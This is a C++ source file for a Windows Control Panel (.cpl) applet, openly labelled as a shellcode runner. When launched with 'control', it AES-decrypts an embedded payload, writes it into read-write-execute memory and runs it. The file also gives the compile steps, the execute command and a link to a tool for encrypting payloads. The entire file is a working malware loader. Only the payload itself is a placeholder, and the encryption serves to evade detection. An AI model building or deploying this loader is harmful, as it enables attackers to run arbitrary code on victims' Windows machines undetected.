/*
	Proof of Concept CPL shellcode runner in c++ using AES encrypted payload.

	Author: @thelikes

	Compile:
	1. "x86_64-w64-mingw32-g++.exe" -Wall -DBUILD_DLL -O2 -c aes.c -o bin\aes.o
	2. "x86_64-w64-mingw32-g++.exe" -Wall -DBUILD_DLL -O2 -c main.cpp -o bin\main.o
	3. "x86_64-w64-mingw32-g++.exe" -shared -Wl,--dll bin\main.o bin\aes.o -o bin\main.dll

	Execute:
	> control .\evil.cpl

	Sources:
	- https://github.com/gtrubach/MyCPLApplet/
	- https://gist.github.com/securitytube/c956348435cc90b8e1f7
	- https://github.com/kokke/tiny-AES-c
	- https://gitlab.com/ORCA666/aesshellenc
*/

#include <windows.h>
#include "aes.h"

#define DLL_EXPORT __declspec(dllexport)

DWORD WINAPI ThreadFunction()
{
	LPVOID newMemory;
	HANDLE currentProcess;
	SIZE_T bytesWritten;
	BOOL didWeCopy = FALSE;

	// generate tiny-aes encrypted shellcode using:
	// https://gitlab.com/ORCA666/aesshellenc/-/blob/main/AESShellEnc/main.c
	unsigned char shellcode[] = "PAYLOAD";

    DWORD shellcodelen = sizeof(shellcode);

	unsigned char key[] = "Captain.MeeloIsTheSuperSecretKey";
    // key should be 32 bytes
    unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
    // iv should be 16
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, shellcodelen);

	// Get the current process handle 
	currentProcess = GetCurrentProcess();

	// Allocate memory with Read+Write+Execute permissions 
	newMemory = VirtualAllocEx(currentProcess, NULL, shellcodelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (newMemory == NULL)
		return -1;

	// Copy the shellcode into the memory we just created 
	didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&shellcode, shellcodelen, &bytesWritten);

	if (!didWeCopy)
		return -2;

	// Yay! Let's run our shellcode! 
	((void(*)())newMemory)();

	return 1;
}

extern "C" DLL_EXPORT LONG APIENTRY CPlApplet(
    HWND hwndCPL,       // handle of Control Panel window
    UINT uMsg,          // message
    LONG_PTR lParam1,       // first message parameter
    LONG_PTR lParam2        // second message parameter
) {
    LONG retCode = 0;

    // debug
    //MessageBoxA(nullptr, "cplapplet", "cplapplet", MB_OK);

    ThreadFunction();

    return retCode;
}

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            break;

        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

        case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    }
    return TRUE;
}
